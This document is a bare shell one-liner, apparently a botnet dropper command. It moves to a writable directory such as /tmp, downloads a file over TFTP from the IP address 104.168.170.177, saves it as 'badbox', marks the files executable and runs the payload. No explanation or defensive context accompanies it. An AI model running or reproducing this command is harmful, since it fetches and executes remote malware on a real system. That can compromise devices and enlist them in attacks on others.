cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 104.168.170.177;cat sh >badbox;chmod +x *;./badbox
